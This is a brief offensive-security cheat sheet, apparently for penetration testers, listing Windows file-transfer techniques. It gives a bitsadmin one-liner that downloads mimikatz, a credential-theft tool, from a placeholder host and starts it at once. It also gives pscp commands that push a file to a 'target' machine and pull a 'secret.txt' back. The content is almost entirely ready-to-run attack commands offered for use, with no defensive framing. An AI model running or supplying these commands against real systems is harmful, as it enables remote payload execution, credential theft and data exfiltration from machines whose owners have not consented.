# Ultimate File Transfer List
Ultimate File Transfer List


## bitsadmin.exe

cmd.exe /c "bitsadmin.exe /transfer downld_job /download /priority high http://www.trustedsite.com C:\Temp\mimikatz.exe & start C:\Temp\mimikatz.exe"

References: 

https://www.greyhathacker.net/?tag=download-and-execute


## pscp.exe

### Upload
pscp C:\Users\Public\info.txt phineas@target:/tmp/info.txt

### Download
pscp phineas@target:/home/phineas/secret.txt C:\Users\Public\secret.txt
